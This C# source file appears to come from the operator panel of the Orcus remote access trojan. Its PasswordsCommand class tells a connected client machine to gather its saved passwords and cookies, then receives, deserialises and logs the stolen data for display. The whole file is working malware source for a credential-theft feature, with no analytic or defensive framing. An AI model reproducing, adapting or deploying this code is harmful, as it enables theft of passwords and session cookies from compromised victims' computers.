using System;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.Passwords
{
    public class PasswordsCommand : Command
    {
        public event EventHandler<PasswordData> PasswordsReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            var data = new Serializer(typeof (PasswordData)).Deserialize<PasswordData>(parameter);
            LogService.Receive(string.Format((string) Application.Current.Resources["ReceivedPasswords"],
                data.Passwords.Count, data.Cookies.Count));
            PasswordsReceived?.Invoke(this, data);
        }

        public void GetPasswords()
        {
            ConnectionInfo.SendCommand(this, new byte[0]);
            LogService.Send((string) Application.Current.Resources["SearchPasswords"]);
        }

        public override string DescribePackage(byte[] data, bool isReceived)
        {
            return isReceived ? "PasswordsReceived" : "SearchPasswords";
        }

        protected override uint GetId()
        {
            return 12;
        }
    }
}